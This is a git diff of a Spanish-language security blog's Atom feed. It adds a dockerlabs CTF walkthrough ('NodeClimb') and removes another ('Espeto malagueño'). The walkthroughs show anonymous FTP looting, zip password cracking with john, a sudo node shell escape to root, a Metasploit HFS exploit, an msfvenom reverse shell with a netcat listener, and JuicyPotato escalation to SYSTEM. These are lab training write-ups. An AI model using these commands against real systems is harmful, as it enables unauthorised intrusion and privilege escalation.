@@ -1,4 +1,159 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-05T20:47:27+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">Los 40 ladrones</title><link href="/posts/los40ladrones/" rel="alternate" type="text/html" title="Los 40 ladrones" /><published>2024-07-04T00:00:00+00:00</published><updated>2024-07-04T00:00:00+00:00</updated><id>/posts/los40ladrones</id><content type="html" xml:base="/posts/los40ladrones/"><![CDATA[<p><img src="/assets/images/los40/los40.jpg" alt="image" /></p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.3">Jekyll</generator><link href="/feed.xml" rel="self" type="application/atom+xml" /><link href="/" rel="alternate" type="text/html" /><updated>2024-07-05T21:30:19+00:00</updated><id>/feed.xml</id><title type="html">murrusko</title><author><name>murrusko</name><email>murrusko@proton.me</email></author><entry><title type="html">NodeClimb</title><link href="/posts/nodeclimb/" rel="alternate" type="text/html" title="NodeClimb" /><published>2024-07-05T00:00:00+00:00</published><updated>2024-07-05T00:00:00+00:00</updated><id>/posts/nodeclimb</id><content type="html" xml:base="/posts/nodeclimb/"><![CDATA[<p><img src="/assets/images/node/node.png" alt="image" /></p>
+
+<p>Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma <a href="https://dockerlabs.es/">dockerlabs</a>.</p>
+
+<h1 id="enumeración">Enumeración</h1>
+
+<p>Ponemos el docker en marcha con el <code class="language-plaintext highlighter-rouge">auto_deploy.sh</code> que trae el zip. Cuando termina de cargar nos indica la dirección IP de nuestra víctima, en nuestro caso es <code class="language-plaintext highlighter-rouge">172.17.0.2</code>.</p>
+
+<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> a nuestra máquina victima <code class="language-plaintext highlighter-rouge">172.17.0.2</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 172.17.0.2
+PORT   STATE SERVICE
+21/tcp open  ftp
+22/tcp open  ssh
+</code></pre></div></div>
+
+<p>Vemos que solo tiene los puertos <strong>21</strong> y <strong>22</strong>  abiertos. Vamos a realizar otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code> pero esta vez para detectar la versión del servicio que este corriendo, <code class="language-plaintext highlighter-rouge">-sV</code>, y para ejecutar los scripts por defecto para detectar vulnerabilidades, <code class="language-plaintext highlighter-rouge">-sC</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p21</span>,22 172.17.0.2
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     vsftpd 3.0.3
+| ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+|_-rw-r--r--    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|      Connected to ::ffff:172.17.0.1
+|      Logged <span class="k">in </span>as ftp
+|      TYPE: ASCII
+|      No session bandwidth limit
+|      Session <span class="nb">timeout </span><span class="k">in </span>seconds is 300
+|      Control connection is plain text
+|      Data connections will be plain text
+|      At session startup, client count was 4
+|      vsFTPd 3.0.3 - secure, fast, stable
+|_End of status
+22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+| ssh-hostkey: 
+|   256 <span class="nb">cd</span>:1f:3b:2d:c4:0b:99:03:e6:a3:5c:26:f5:4b:47:ae <span class="o">(</span>ECDSA<span class="o">)</span>
+|_  256 a0:d4:92:f6:9b:db:12:2b:77:b6:b1:58:e0:70:56:f0 <span class="o">(</span>ED25519<span class="o">)</span>
+</code></pre></div></div>
+
+<h1 id="intrusión">Intrusión</h1>
+
+<p>Vemos que nos podemos conectar al servidor <strong>ftp</strong> como usuario <em>anónimo</em> y que además hay un fichero a nuestro alcance. Entramos como <strong>ftp</strong> y nos lo descargamos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ftp ftp@172.17.0.2
+Connected to 172.17.0.2.
+220 <span class="o">(</span>vsFTPd 3.0.3<span class="o">)</span>
+331 Please specify the password.
+Password: 
+230 Login successful.
+Remote system <span class="nb">type </span>is UNIX.
+Using binary mode to transfer files.
+ftp&gt; <span class="nb">ls
+</span>229 Entering Extended Passive Mode <span class="o">(||</span>|8580|<span class="o">)</span>
+150 Here comes the directory listing.
+<span class="nt">-rw-r--r--</span>    1 0        0             242 Jul 05 09:34 secretitopicaron.zip
+226 Directory send OK.
+ftp&gt; get secretitopicaron.zip
+<span class="nb">local</span>: secretitopicaron.zip remote: secretitopicaron.zip
+229 Entering Extended Passive Mode <span class="o">(||</span>|49269|<span class="o">)</span>
+150 Opening BINARY mode data connection <span class="k">for </span>secretitopicaron.zip <span class="o">(</span>242 bytes<span class="o">)</span><span class="nb">.</span>
+100% |<span class="k">******************</span>|   242        1.77 MiB/s    00:00 ETA
+226 Transfer complete.
+242 bytes received <span class="k">in </span>00:00 <span class="o">(</span>183.76 KiB/s<span class="o">)</span>
+ftp&gt; bye
+221 Goodbye.
+</code></pre></div></div>
+
+<p>Intentamos descomprimirlo pero vemos que tiene una contraseña. Creamos el hash del fichero zip con <strong>zip2john</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>zip2john secretitopicaron.zip <span class="o">&gt;</span> zip.hash
+ver 1.0 efh 5455 efh 7875 secretitopicaron.zip/password.txt PKZIP Encr: 2b chk, TS_chk, <span class="nv">cmplen</span><span class="o">=</span>52, <span class="nv">decmplen</span><span class="o">=</span>40, <span class="nv">crc</span><span class="o">=</span>59D5D024 <span class="nv">ts</span><span class="o">=</span>4C03 <span class="nv">cs</span><span class="o">=</span>4c03 <span class="nb">type</span><span class="o">=</span>0
+</code></pre></div></div>
+
+<p>Y después intentamos sacar la password del fichero zip:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>john <span class="nt">--wordlist</span><span class="o">=</span>/usr/share/wordlists/rockyou.txt zip.hash 
+Using default input encoding: UTF-8
+Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>PKZIP <span class="o">[</span>32/64]<span class="o">)</span>
+Will run 2 OpenMP threads
+Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
+password1        <span class="o">(</span>secretitopicaron.zip/password.txt<span class="o">)</span>     
+1g 0:00:00:00 DONE <span class="o">(</span>2024-07-05 23:00<span class="o">)</span> 25.00g/s 102400p/s 102400c/s 102400C/s 123456..oooooo
+</code></pre></div></div>
+
+<p>En un segundo tenemos la clave, descomprimimos el fichero y la vemos:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">cat </span>password.txt 
+mario:laKontraseñAmasmalotaHdelbarrioH
+</code></pre></div></div>
+
+<p>Nos conectamos al servidor <strong>ssh</strong> como <em>mario</em>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>ssh mario@172.17.0.2
+mario@172.17.0.2<span class="s1">'s password: 
+Linux 014bc8cff695 6.8.11-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.8.11-1kali2 (2024-05-30) x86_64
+</span></code></pre></div></div>
+
+<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
+
+<p>Vemos que puede ejecutar como <strong>root</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+Matching Defaults entries <span class="k">for </span>mario on 014bc8cff695:
+    env_reset, mail_badpass,
+    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin,
+    use_pty
+
+User mario may run the following commands on 014bc8cff695:
+    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/node /home/mario/script.js
+</code></pre></div></div>
+
+<p>Puede ejecutar un script en node que esta vacio en el home de mario. Miramos a ver si hay algo en el historial de bash:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">cat</span> .bash_history 
+<span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="nb">sudo</span> /usr/local/bin/node <span class="nt">-e</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span> 
+/usr/local/bin/node
+locate node
+apt <span class="nb">install </span>locate
+<span class="nb">exit
+sudo</span> <span class="nt">-l</span>
+/usr/bin/node
+<span class="nb">sudo</span> /usr/bin/node <span class="nt">-e</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span>
+<span class="nb">exit
+sudo</span> <span class="nt">-l</span>
+<span class="nb">ls
+exit
+ls
+whoami
+sudo</span> <span class="nt">-l</span>
+<span class="nb">cat </span>script.js 
+<span class="nb">ls</span> <span class="nt">-l</span>
+<span class="nb">exit</span>
+
+</code></pre></div></div>
+
+<p>Curiosamente nos da una pista de cómo obtener la shell desde node. Añadimos al fichero <strong>script.js</strong> la función para la creación de una shell:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mario@014bc8cff695:~<span class="nv">$ </span><span class="nb">echo</span> <span class="s1">'require("child_process").spawn("/bin/sh", {stdio: [0, 1, 2]})'</span> <span class="o">&gt;</span> script.js
+</code></pre></div></div>
+
+<p>Y ejecutamos el comando con sudo:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/node /home/mario/script.js# <span class="nb">whoami</span><span class="p">;</span><span class="nb">hostname</span><span class="p">;</span><span class="nb">date
+</span>root
+014bc8cff695
+Fri Jul  5 21:14:24 UTC 2024
+<span class="c">#</span>
+</code></pre></div></div>
+
+<p>Con esto ya seriamos <strong>root</strong> en la máquina.</p>
+
+<p>Un saludo</p>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="facil" /><summary type="html"><![CDATA[]]></summary></entry><entry><title type="html">Los 40 ladrones</title><link href="/posts/los40ladrones/" rel="alternate" type="text/html" title="Los 40 ladrones" /><published>2024-07-04T00:00:00+00:00</published><updated>2024-07-04T00:00:00+00:00</updated><id>/posts/los40ladrones</id><content type="html" xml:base="/posts/los40ladrones/"><![CDATA[<p><img src="/assets/images/los40/los40.jpg" alt="image" /></p>
 
 <p>Estamos ante un docker que contiene una distribución Linux. Es de nivel fácil y es de la plataforma <a href="https://dockerlabs.es">dockerlabs</a>.</p>
 
@@ -2341,267 +2496,4 @@ ce_cve_2023_32315<span class="o">)</span> <span class="o">&gt;</span> run
 <span class="nb">hostname
 </span>9566bdac1160
 
-</code></pre></div></div>]]></content><author><name>murrusko</name><email>murrusko@proton.me</email></author><category term="dockerlabs" /><category term="ctf" /><category term="linux" /><category term="medio" /><summary type="html"><![CDATA[Estamos ante un docker que contiene una distribución Linux. Es de nivel medio y es de la plataforma dockerlabs.]]></summary></entry><entry><title type="html">Espeto malagueño</title><link href="/posts/espeto/" rel="alternate" type="text/html" title="Espeto malagueño" /><published>2024-06-23T00:00:00+00:00</published><updated>2024-06-23T00:00:00+00:00</updated><id>/posts/espeto</id><content type="html" xml:base="/posts/espeto/"><![CDATA[<p>Estamos ante una máquina Windows de nivel principiante creada por <a href="https://www.curiosidadesdehackers.com/">CuriosidadesDeHackers</a> y <a href="https://www.youtube.com/@CondorHacks">condor</a> de la plataforma <a href="https://thehackerslabs.com/">The Hackers Labs</a>.</p>
-
-<p>Una vez importada la máquina a nuestro VirtualBox hacemos un escaneo de IPs a nuestra red:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>arp-scan <span class="nt">-I</span> eth1 <span class="nt">--localnet</span>
-Interface: eth1, <span class="nb">type</span>: EN10MB, MAC: 08:00:27:5e:91:9b, IPv4: 10.0.2.5
-Starting arp-scan 1.10.0 with 256 hosts <span class="o">(</span>https://github.com/royhills/arp-scan<span class="o">)</span>
-10.0.2.1        52:54:00:12:35:00       QEMU
-10.0.2.2        52:54:00:12:35:00       QEMU
-10.0.2.3        08:00:27:5b:2e:9c       PCS Systemtechnik GmbH
-10.0.2.141      08:00:27:47:5a:9d       PCS Systemtechnik GmbH
-</code></pre></div></div>
-
-<p>Como vemos la máquina tiene asignada la IP <code class="language-plaintext highlighter-rouge">10.0.2.141</code>.</p>
-
-<h1 id="enumeración">Enumeración</h1>
-
-<p>Empezamos realizando un escaneo de puertos con <code class="language-plaintext highlighter-rouge">nmap</code>. Hacemos un escaneo silencioso<code class="language-plaintext highlighter-rouge">-sS</code>, a todos los puertos <code class="language-plaintext highlighter-rouge">-p-</code>, que no haga ping al host <code class="language-plaintext highlighter-rouge">-Pn</code>, que no haga resolución de DNS <code class="language-plaintext highlighter-rouge">-n</code> , que nos de detalles del escaneo <code class="language-plaintext highlighter-rouge">-v</code>, a nuestra máquina victima <code class="language-plaintext highlighter-rouge">10.0.2.141</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sS</span> <span class="nt">-p-</span> <span class="nt">-Pn</span> <span class="nt">-n</span> <span class="nt">-v</span> 10.0.2.141
-PORT      STATE SERVICE
-80/tcp    open  http
-135/tcp   open  msrpc
-139/tcp   open  netbios-ssn
-445/tcp   open  microsoft-ds
-5985/tcp  open  wsman
-47001/tcp open  winrm
-49152/tcp open  unknown
-49153/tcp open  unknown
-49154/tcp open  unknown
-49155/tcp open  unknown
-49156/tcp open  unknown
-49158/tcp open  unknown
-</code></pre></div></div>
-
-<p>Una vez que tenemos qué puertos están abiertos hacemos otro escaneo con <code class="language-plaintext highlighter-rouge">nmap</code>, pero esta vez para ver con mas detalle que hay en esos puertos:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span><span class="nb">sudo </span>nmap <span class="nt">-sCV</span> <span class="nt">-p80</span>,135,139,445,5985,47001,49152,49153,49154,49155,49156,49158 <span class="nt">-v</span> 10.0.2.141
-PORT      STATE SERVICE      VERSION
-80/tcp    open  http         HttpFileServer httpd 2.3
-|_http-title: HFS /
-|_http-server-header: HFS 2.3
-| http-methods: 
-|_  Supported Methods: GET HEAD POST
-|_http-favicon: Unknown favicon MD5: 759792EDD4EF8E6BC2D1877D27153CB1
-135/tcp   open  msrpc        Microsoft Windows RPC
-139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
-445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
-5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
-|_http-server-header: Microsoft-HTTPAPI/2.0
-|_http-title: Not Found
-49152/tcp open  msrpc        Microsoft Windows RPC
-49153/tcp open  msrpc        Microsoft Windows RPC
-49154/tcp open  msrpc        Microsoft Windows RPC
-49155/tcp open  msrpc        Microsoft Windows RPC
-49156/tcp open  msrpc        Microsoft Windows RPC
-49158/tcp open  msrpc        Microsoft Windows RPC
-
-Host script results:
-| smb-security-mode: 
-|   account_used: guest
-|   authentication_level: user
-|   challenge_response: supported
-|_  message_signing: disabled <span class="o">(</span>dangerous, but default<span class="o">)</span>
-| smb2-time: 
-|   <span class="nb">date</span>: 2024-06-23T13:28:01
-|_  start_date: 2024-06-23T13:23:16
-| smb2-security-mode: 
-|   3:0:2: 
-|_    Message signing enabled but not required
-| nbstat: NetBIOS name: WIN-RE8NJPG9K5N, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: 08:00:27:47:5a:9d <span class="o">(</span>Oracle VirtualBox virtual NIC<span class="o">)</span>
-| Names:
-|   WORKGROUP&lt;00&gt;        Flags: &lt;group&gt;&lt;active&gt;
-|   WIN-RE8NJPG9K5N&lt;00&gt;  Flags: &lt;unique&gt;&lt;active&gt;
-|_  WIN-RE8NJPG9K5N&lt;20&gt;  Flags: &lt;unique&gt;&lt;active&gt;
-|_clock-skew: mean: 4m43s, deviation: 0s, median: 4m43s
-
-</code></pre></div></div>
-
-<p>En el resultado vemos que en el puerto <code class="language-plaintext highlighter-rouge">80</code> hay un servidor <code class="language-plaintext highlighter-rouge">HFS 2.3</code> <code class="language-plaintext highlighter-rouge">(HTTP File Server)</code>.
-<img src="/assets/images/espeto/1.png" alt="image" /></p>
-
-<h1 id="intrusión">Intrusión</h1>
-
-<p>Con <code class="language-plaintext highlighter-rouge">Metasploit</code> buscamos por si hubiera algún exploit disponible para esa versión.</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> search hfs 2.3
-
-Matching Modules
-<span class="o">================</span>
-
-   <span class="c">#  Name                                        Disclosure Date  Rank       Check  Description</span>
-   -  <span class="nt">----</span>                                        <span class="nt">---------------</span>  <span class="nt">----</span>       <span class="nt">-----</span>  <span class="nt">-----------</span>
-   0  exploit/multi/http/git_client_command_exec  2014-12-18       excellent  No     Malicious Git and Mercurial HTTP Server For CVE-2014-9390
-   1    <span class="se">\_</span> target: Automatic                      <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
-   2    <span class="se">\_</span> target: Windows Powershell             <span class="nb">.</span>                <span class="nb">.</span>          <span class="nb">.</span>      <span class="nb">.</span>
-   3  exploit/windows/http/rejetto_hfs_exec       2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
-</code></pre></div></div>
-
-<p>Vemos que si que hay. Seleccionamos la opción 3 <code class="language-plaintext highlighter-rouge">use 3</code> y vemos las opciones disponibles que hay para el exploit con <code class="language-plaintext highlighter-rouge">options</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 <span class="o">&gt;</span> use 3
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> No payload configured, defaulting to windows/meterpreter/reverse_tcp
-msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> options
-
-Module options <span class="o">(</span>exploit/windows/http/rejetto_hfs_exec<span class="o">)</span>:
-
-   Name       Current Setting  Required  Description
-   <span class="nt">----</span>       <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
-   HTTPDELAY  10               no        Seconds to <span class="nb">wait </span>before terminating web server
-   Proxies                     no        A proxy chain of format <span class="nb">type</span>:host:port[,type:host:port][...]
-   RHOSTS                      <span class="nb">yes       </span>The target host<span class="o">(</span>s<span class="o">)</span>, see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
-   RPORT      80               <span class="nb">yes       </span>The target port <span class="o">(</span>TCP<span class="o">)</span>
-   SRVHOST    0.0.0.0          <span class="nb">yes       </span>The <span class="nb">local </span>host or network interface to listen on. This must be an address on the <span class="nb">local </span>machine or 0.0.0.0 to listen on all
-                                          addresses.
-   SRVPORT    8080             <span class="nb">yes       </span>The <span class="nb">local </span>port to listen on.
-   SSL        <span class="nb">false            </span>no        Negotiate SSL/TLS <span class="k">for </span>outgoing connections
-   SSLCert                     no        Path to a custom SSL certificate <span class="o">(</span>default is randomly generated<span class="o">)</span>
-   TARGETURI  /                <span class="nb">yes       </span>The path of the web application
-   URIPATH                     no        The URI to use <span class="k">for </span>this exploit <span class="o">(</span>default is random<span class="o">)</span>
-   VHOST                       no        HTTP server virtual host
-
-Payload options <span class="o">(</span>windows/meterpreter/reverse_tcp<span class="o">)</span>:
-
-   Name      Current Setting  Required  Description
-   <span class="nt">----</span>      <span class="nt">---------------</span>  <span class="nt">--------</span>  <span class="nt">-----------</span>
-   EXITFUNC  process          <span class="nb">yes       </span>Exit technique <span class="o">(</span>Accepted: <span class="s1">''</span>, seh, thread, process, none<span class="o">)</span>
-   LHOST     192.168.1.12     <span class="nb">yes       </span>The listen address <span class="o">(</span>an interface may be specified<span class="o">)</span>
-   LPORT     4444             <span class="nb">yes       </span>The listen port
-
-Exploit target:
-
-   Id  Name
-   <span class="nt">--</span>  <span class="nt">----</span>
-   0   Automatic
-
-</code></pre></div></div>
-
-<p>En nuestro caso cambiamos el Remote Host <code class="language-plaintext highlighter-rouge">set rhost 10.0.2.141</code> y el puerto que utiliza el exploit para hacer la explotación <code class="language-plaintext highlighter-rouge">set srvport 8081</code>. Ejecutamos el exploit con <code class="language-plaintext highlighter-rouge">exploit</code> y si todo ha salido bien, obtenemos una sesión de <code class="language-plaintext highlighter-rouge">meterpreter</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>rhosts 10.0.2.141
-rhosts <span class="o">=&gt;</span> 10.0.2.141
-msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>srvport 8081
-srvport <span class="o">=&gt;</span> 8081
-msf6 exploit<span class="o">(</span>windows/http/rejetto_hfs_exec<span class="o">)</span> <span class="o">&gt;</span> exploit
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Started reverse TCP handler on 192.168.1.12:4444 
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Using URL: http://192.168.1.12:8081/W4iYw9
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server started.
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending a malicious request to /
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Payload request received: /W4iYw9
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Sending stage <span class="o">(</span>176198 bytes<span class="o">)</span> to 192.168.1.11
-<span class="o">[!]</span> Tried to delete %TEMP%<span class="se">\U</span>nngBBbR.vbs, unknown result
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Meterpreter session 1 opened <span class="o">(</span>192.168.1.12:4444 -&gt; 192.168.1.11:62032<span class="o">)</span> at 2024-06-23 15:32:58 +0200
-
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Server stopped.
-
-meterpreter <span class="o">&gt;</span> 
-
-</code></pre></div></div>
-
-<p>Vemos con que usuario estamos en el sistema con <code class="language-plaintext highlighter-rouge">getuid</code> y que privilegios tiene <code class="language-plaintext highlighter-rouge">getprivs</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> getuid
-Server username: WIN-RE8NJPG9K5N<span class="se">\h</span>acker
-
-meterpreter <span class="o">&gt;</span> getprivs
-
-Enabled Process Privileges
-<span class="o">==========================</span>
-
-Name
-<span class="nt">----</span>
-SeChangeNotifyPrivilege
-SeCreateGlobalPrivilege
-SeImpersonatePrivilege
-SeIncreaseWorkingSetPrivilege
-</code></pre></div></div>
-
-<p>Buscamos información del sistema con <code class="language-plaintext highlighter-rouge">sysinfo</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> sysinfo
-Computer        : WIN-RE8NJPG9K5N
-OS              : Windows Server 2012 R2 <span class="o">(</span>6.3 Build 9600<span class="o">)</span><span class="nb">.</span>
-Architecture    : x64
-System Language : es_ES
-Domain          : WORKGROUP
-Logged On Users : 1
-Meterpreter     : x86/windows
-</code></pre></div></div>
-
-<h1 id="escalada-de-privilegios">Escalada de privilegios</h1>
-
-<p>Ahora nos queda obtener privilegios de administrador. Para ello, nos aprovechamos de los privilegios del usuario. En <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/privilege-escalation-abusing-tokens">hacktricks</a> vemos las diferentes posibilidades que tenemos. Yo voy a usar <a href="https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation/juicypotato">JuicyPotato</a> para la escalada.</p>
-
-<p>Descargamos <a href="https://objects.githubusercontent.com/github-production-release-asset-2e65be/142582717/538c8db8-9c94-11e8-84e5-46a5d9473358?X-Amz-Algorithm=AWS4-HMAC-SHA256&amp;X-Amz-Credential=releaseassetproduction%2F20240621%2Fus-east-1%2Fs3%2Faws4_request&amp;X-Amz-Date=20240621T172808Z&amp;X-Amz-Expires=300&amp;X-Amz-Signature=cc316de6c04358d3f93c007d7c6ca6e16edc972949549ffce1471cc4526e01e0&amp;X-Amz-SignedHeaders=host&amp;actor_id=0&amp;key_id=0&amp;repo_id=142582717&amp;response-content-disposition=attachment%3B%20filename%3DJuicyPotato.exe&amp;response-content-type=application%2Foctet-stream">JuicyPotato</a> :</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe
-</code></pre></div></div>
-
-<p>Creamos una shell reversa para windows con <code class="language-plaintext highlighter-rouge">msfvenom</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/shell_reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>10.0.2.5 <span class="nv">LPORT</span><span class="o">=</span>8889 <span class="nt">-f</span> exe <span class="nt">-o</span> shell.exe
-</code></pre></div></div>
-
-<p>Nos ponemos a la escucha:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$ </span>nc <span class="nt">-nlvp</span> 8889
-listening on <span class="o">[</span>any] 8889 ...
-
-</code></pre></div></div>
-
-<p>Subimos JuicyPotato y la shell que acamos de generar a la máquina victima. Después desde meterpreter abrimos una shell con <code class="language-plaintext highlighter-rouge">shell</code>:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter <span class="o">&gt;</span> upload JuicyPotato.exe
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading  : /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded 339.50 KiB of 339.50 KiB <span class="o">(</span>100.0%<span class="o">)</span>: /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : /home/murrusko/vms/espeto/JuicyPotato.exe -&gt; JuicyPotato.exe
-meterpreter <span class="o">&gt;</span> upload shell.exe
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploading  : /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Uploaded 72.07 KiB of 72.07 KiB <span class="o">(</span>100.0%<span class="o">)</span>: /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
-<span class="o">[</span><span class="k">*</span><span class="o">]</span> Completed  : /home/murrusko/vms/espeto/shell.exe -&gt; shell.exe
-meterpreter <span class="o">&gt;</span> shell
-Process 1192 created.
-Channel 4 created.
-Microsoft Windows <span class="o">[</span>Versi�n 6.3.9600]
-<span class="o">(</span>c<span class="o">)</span> 2013 Microsoft Corporation. Todos los derechos reservados.
-
-C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;
-
-</code></pre></div></div>
-
-<p>Ejecutamos JuicyPotato:</p>
-
-<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\h</span>acker<span class="se">\D</span>ownloads&gt;.<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> .<span class="se">\s</span>hell.exe
-.<span class="se">\J</span>uicyPotato.exe <span class="nt">-l</span> 443 <span class="nt">-t</span> <span class="k">*</span> <span class="nt">-p</span> .<span class="se">\s</span>hell.exe
-Testing <span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span> 443
-....
-<span class="o">[</span>+] authresult 0
-<span class="o">{</span>4991d34b-80a1-4291-83b6-3328366b9097<span class="o">}</span><span class="p">;</span>NT AUTHORITY<span class="se">\S</span>YSTEM
-
-<span class="o">[</span>+] CreateProcessWithTokenW OK
